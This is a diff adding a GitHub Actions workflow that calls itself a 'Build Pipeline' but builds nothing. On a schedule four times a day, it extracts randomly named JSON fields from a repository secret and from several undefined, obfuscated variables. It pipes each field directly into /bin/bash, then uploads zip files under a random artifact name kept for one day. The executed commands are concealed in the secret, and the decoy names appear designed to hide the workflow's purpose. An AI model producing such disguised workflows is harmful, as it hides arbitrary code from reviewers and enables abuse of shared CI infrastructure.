@@ -1,0 +1,33 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '12 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          j1: ${{ secrets.j1 }}
+        run: |
+          printf '%s' "$j1" | jq -r .ilqe6245 | /bin/bash
+          echo $dnt47 | jq -r .tifx13736 | /bin/bash
+          printf '%s' "$gk4277" | jq -r .tlid650 | /bin/bash
+          echo $gy345 | jq -r .opwlc51321 | /bin/bash
+          printf '%s' "$es536" | jq -r .fndr17518 | /bin/bash
+          printf '%s' "$fom4" | jq -r .jz81 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: PEuNj1Cq
+          path: "*.zip"
+          retention-days: 1
